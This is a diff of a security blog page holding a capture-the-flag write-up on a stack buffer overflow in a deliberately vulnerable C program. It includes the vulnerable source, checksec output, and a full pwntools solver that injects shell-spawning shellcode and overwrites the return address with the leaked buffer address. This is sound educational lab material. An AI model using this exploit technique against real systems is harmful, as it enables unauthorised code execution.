@@ -1,220 +1,127 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ret2shellcode // r3t0x</title>
-    <link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
-    <meta name="description" content="NX is off — the stack is executable. Inject your shellcode, find the buffer address, and redirect execution straight into your payload. Raw shellcode ">
-    <link rel="stylesheet" href="../../../static/css/style.css?v=43fea522e0ce">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0c0c0e">
+<title>ret2shellcode — FST Bootcamp — r3t0x</title>
+<meta name="description" content="NX is off — the stack is executable. Inject your shellcode, find the buffer address, and redirect execution straight into your payload. Raw shellcode…">
+<meta name="author" content="Ghaith Amdouni">
+<link rel="canonical" href="https://r3t0x.me/challenge/fst-bootcamp/ret2shellcode/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2shellcode — FST Bootcamp — r3t0x">
+<meta property="og:description" content="NX is off — the stack is executable. Inject your shellcode, find the buffer address, and redirect execution straight into your payload. Raw shellcode…">
+<meta property="og:url" content="https://r3t0x.me/challenge/fst-bootcamp/ret2shellcode/">
+<meta property="og:image" content="https://r3t0x.me/static/img/social-card.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
+<link rel="alternate" type="application/rss+xml" title="r3t0x — writeups" href="/feed.xml">
+<link rel="stylesheet" href="/static/css/main.css?v=f322459a0a">
+<script src="/static/js/main.js?v=f322459a0a" defer></script>
 </head>
 <body>
-    <!-- Genjutsu Transition Overlay -->
-    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
-        <div class="eyelid eyelid-top"></div>
-        <div class="eyelid eyelid-bottom"></div>
-        <div class="genjutsu-eye">
-                <svg viewBox="0 0 200 200">
-                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
-                    <!-- Base 3-Tomoe -->
-                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
-                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
-                        <circle cx="100" cy="100" r="16" fill="#000"/>
-                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
-                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                    </g>
-                    <!-- Uploaded Image Mangekyo -->
-                    <defs>
-                        <clipPath id="circleClip">
-                            <circle cx="100" cy="100" r="98" />
-                        </clipPath>
-                    </defs>
-                    <image href="../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
-                </svg>
-        </div>
-    </div>
-    <div class="scanlines"></div>
-    <div class="scroll-indicator" id="scrollIndicator"></div>
-    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
-    <div class="pwndbg-bg" id="pwndbgBg"></div>
-
-    <div class="container" style="gap: 40px;">
-
-        <a href="../../../index.html" class="back-link">← pwndbg> back</a>
-
-        <div class="chall-header">
-            <h1><span class="prefix">./</span>ret2shellcode<span class="cursor-blink">_</span></h1>
-            <div class="chall-meta-row">
-                <span class="tag">PWN</span>
-                <span>FST Bootcamp</span>
-                <span>0x7afb1997</span>
-                <span>by r3t0x</span>
-                
-                <span>
-                    <span class="difficulty">
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                    </span>
-                </span>
-            </div>
-        </div>
-
-        <!-- Description -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DESCRIPTION</div>
-            <div class="code-block">
-                NX is off — the stack is executable. Inject your shellcode, find the buffer address, and redirect execution straight into your payload. Raw shellcode injection at its finest.
-            </div>
-        </div>
-
-
-
-        
-        <!-- Source Code / Disasm -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DISASM // SOURCE</div>
-            
-            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// main.c</div>
-            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
-#include &lt;unistd.h&gt;
-
-int main() {
-    char buf[128];
-    printf(&#34;Hey, hacker! here is a small gift for u: %p\n&#34;, buf);
-    printf(&#34;Spill your guts: &#34;);
-    fflush(stdout);
-    read(0, buf, 256);
-    printf(&#34;Thanks for the input! Exiting gracefully...\n&#34;);
-    return 0;
-}</pre>
-            </div>
-            
-        </div>
-        
-
-        
-        <!-- Writeup -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
-            <div class="writeup-content">
-                <h1>ret2shellcode — Writeup</h1>
-<h2>Challenge Overview</h2>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Category</strong></td>
-<td>PWN</td>
-</tr>
-<tr>
-<td><strong>Difficulty</strong></td>
-<td>Easy</td>
-</tr>
-<tr>
-<td><strong>Author</strong></td>
-<td>R3t0x</td>
-</tr>
-<tr>
-<td><strong>Technique</strong></td>
-<td>Return to Shellcode</td>
-</tr>
-</tbody>
-</table>
-<h2>Reconnaissance</h2>
-<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./main
-<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
-<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
-<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found
-<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>disabled
-<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE
-</code></pre></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="masthead">
+  <div class="shell">
+    <a class="brand" href="/"><img class="mark" src="/static/img/mangekyou.png" alt="" width="20" height="20" loading="lazy" decoding="async"><span>r3t0x</span></a>
+    <nav aria-label="Main"><a href="/">home</a><a href="/blog/" aria-current="page">writeups</a><a href="/projects/">projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>cv</a></nav>
+    <button type="button" class="search-open" data-open-search aria-label="Search the site">search<kbd>/</kbd></button>
+  </div>
+</header>
+<main id="main"><div class="shell narrow"><article class="writeup">
+  <header class="page-head">
+    <p class="kicker"><a href="/blog/#fst-bootcamp">FST Bootcamp</a> / pwn</p>
+    <h1>ret2shellcode</h1>
+    <p class="lede">NX is off — the stack is executable. Inject your shellcode, find the buffer address, and redirect execution straight into your payload. Raw shellcode…</p>
+    <dl class="facts">
+      <div><dt>difficulty</dt><dd>easy</dd></div>
+      <div><dt>points</dt><dd>—</dd></div>
+      <div><dt>published</dt><dd><time datetime="2026-09-28">28 Sept 2026</time></dd></div>
+      <div><dt>author</dt><dd>R3t0x</dd></div>
+    </dl>
+    <p class="tags"><span>Return to Shellcode</span></p>
+  </header>
+  <nav class="toc" aria-label="On this page"><p>contents</p><ol><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#strategy">Strategy</a></li><li><a href="#result">Result</a></li><li><a href="#solver">Reference solver</a></li><li><a href="#flag">Flag</a></li></ol></nav>
+  <div class="prose">
+    <h2 id="reconnaissance">Reconnaissance</h2>
+<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>pwndbg&gt; checksec ./main
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE</code></pre></figure>
 
 <p><strong>NX is disabled</strong> — the stack is executable! The binary also prints the buffer address:</p>
-<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hey, hacker! here is a small gift for u: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
-<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">);</span><span class="w">  </span><span class="c1">// 256 bytes into 128-byte buffer</span>
-</code></pre></div>
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>printf(&quot;Hey, hacker! here is a small gift for u: %p\n&quot;, buf);
+read(0, buf, 256);  // 256 bytes into 128-byte buffer</code></pre></figure>
 
-<h2>Strategy</h2>
+<h2 id="strategy">Strategy</h2>
 <ol>
 <li>Parse the leaked buffer address</li>
 <li>Place shellcode in the buffer</li>
 <li>Overflow RIP to point back to the buffer address</li>
 </ol>
-<div class="codehilite"><pre><span></span><code><span class="n">buf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
-<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">136</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
-</code></pre></div>
-
-<h2>Result</h2>
-<div class="codehilite"><pre><span></span><code>Hey, hacker! here is a small gift for u: 0x7fffffffdc70
-$ cat flag.txt
-Securinets_fst{C0ngr4ts_2_U_St4ck_4buS3r_D4ddy_W0uld_B_Pr0ud}
-</code></pre></div>
-            </div>
-        </div>
-        
-
-        
-        <!-- Exploit / Solver -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
-            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
-                <span style="color: var(--gdb-green);">$</span> python3 solve.py
-            </div>
-            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">#!/usr/bin/env python3
-from pwn import *
-
-# Set up the context
-context.arch = &#39;amd64&#39;
-context.os = &#39;linux&#39;
-
-#p = process(&#39;./main&#39;)
-p=remote(&#34;localhost&#34;,7007)
-p.recvuntil(b&#39;here is a small gift for u: &#39;)
-buffer_addr = int(p.recvline().strip(), 16)
-log.info(f&#34;Buffer address: {hex(buffer_addr)}&#34;)
-
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>buf_addr = int(io.recvline().split(b'0x')[1], 16)
 shellcode = asm(shellcraft.sh())
-log.info(f&#34;Shellcode length: {len(shellcode)} bytes&#34;)
+payload = shellcode + b'A' * (136 - len(shellcode)) + p64(buf_addr)</code></pre></figure>
 
-# Build the payload
-offset = 136 
-payload = b&#39;&#39;
+<h2 id="result">Result</h2>
+<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>Hey, hacker! here is a small gift for u: 0x7fffffffdc70
+$ cat flag.txt
+Securinets_fst{C0ngr4ts_2_U_St4ck_4buS3r_D4ddy_W0uld_B_Pr0ud}</code></pre></figure>
+    <h2 id="solver">Reference solver</h2>
+    <figure class="code"><figcaption><span>solve.py</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-python"><span class="t-c">#!/usr/bin/env python3</span>
+<span class="t-k">from</span> pwn <span class="t-k">import</span> *
+
+<span class="t-c"># Set up the context</span>
+context.arch = <span class="t-s">'amd64'</span>
+context.os = <span class="t-s">'linux'</span>
+
+<span class="t-c">#p = process('./main')</span>
+p=<span class="t-f">remote</span>(<span class="t-s">&quot;localhost&quot;</span>,<span class="t-m">7007</span>)
+p.<span class="t-f">recvuntil</span>(b<span class="t-s">'here is a small gift for u: '</span>)
+buffer_addr = <span class="t-f">int</span>(p.<span class="t-f">recvline</span>().<span class="t-f">strip</span>(), <span class="t-m">16</span>)
+log.<span class="t-f">info</span>(f<span class="t-s">&quot;Buffer address: {hex(buffer_addr)}&quot;</span>)
+
+shellcode = <span class="t-f">asm</span>(shellcraft.<span class="t-f">sh</span>())
+log.<span class="t-f">info</span>(f<span class="t-s">&quot;Shellcode length: {len(shellcode)} bytes&quot;</span>)
+
+<span class="t-c"># Build the payload</span>
+offset = <span class="t-m">136</span> 
+payload = b<span class="t-s">''</span>
 payload += shellcode  
-payload += b&#39;A&#39; * (offset - len(shellcode))  
-payload += p64(buffer_addr)  
+payload += b<span class="t-s">'A'</span> * (offset - <span class="t-f">len</span>(shellcode))  
+payload += <span class="t-f">p64</span>(buffer_addr)  
 
-# Send the payload
-p.sendlineafter(b&#39;Spill your guts: &#39;, payload)
+<span class="t-c"># Send the payload</span>
+p.<span class="t-f">sendlineafter</span>(b<span class="t-s">'Spill your guts: '</span>, payload)
 
-# Interact with the shell
-log.success(&#34;Exploit sent! Dropping to shell...&#34;)
-p.interactive()</pre>
-            </div>
-        </div>
-        
-
-        <div style="height: 80px;"></div>
-    </div>
-
-    <script src="../../../static/js/main.js?v=43fea522e0ce"></script>
+<span class="t-c"># Interact with the shell</span>
+log.<span class="t-f">success</span>(<span class="t-s">&quot;Exploit sent! Dropping to shell...&quot;</span>)
+p.<span class="t-f">interactive</span>()</code></pre></figure>
+    <h2 id="flag">Flag</h2>
+    <p class="flag"><code>Securinets_fst{C0ngr4ts_2_U_St4ck_4buS3r_D4ddy_W0uld_B_Pr0ud}</code><button type="button" class="copy" data-copy>copy</button></p>
+  </div>
+  <nav class="pager" aria-label="More writeups">
+    <a href="/challenge/fst-bootcamp/please/"><span>previous</span><strong>please</strong></a>
+    <a class="next" href="/challenge/fst-bootcamp/captchahell/"><span>next</span><strong>captchahell</strong></a>
+  </nav>
+</article></div></main>
+<footer class="colophon">
+  <div class="shell">
+    <p><strong>Ghaith Amdouni</strong> · Binary exploitation &amp; systems · Tunis, Tunisia</p>
+    <nav aria-label="Elsewhere"><a href="https://github.com/Ghaith-amdouni">GitHub</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn</a><a href="https://www.credly.com/users/ghaith-amdouni">Credly</a><a href="/feed.xml">RSS</a><a href="mailto:ghaith.amdouni@insat.ucar.tn">email</a></nav>
+    <p class="fine">© 2026 Ghaith Amdouni · <a href="https://github.com/Ghaith-amdouni/ghaith-amdouni.github.io">site source</a><img class="hits" src="https://hits.sh/r3t0x.me.svg?view=total&style=flat-square&label=visits&color=161619&labelColor=0c0c0e" alt="" width="88" height="20" loading="lazy"></p>
+  </div>
+</footer>
+<dialog id="search" aria-label="Search">
+  <form method="dialog" class="search-head">
+    <label for="search-input"><span aria-hidden="true">&gt;</span><span class="sr-only">Search writeups, projects and pages</span></label>
+    <input id="search-input" type="search" placeholder="search writeups, projects, pages" autocomplete="off" spellcheck="false">
+    <button value="close" aria-label="Close search">esc</button>
+  </form>
+  <ul id="search-results"></ul>
+  <p class="search-foot"><span id="search-count">start typing</span><span>&uarr;&darr; move · enter open</span></p>
+</dialog>
 </body>
 </html>
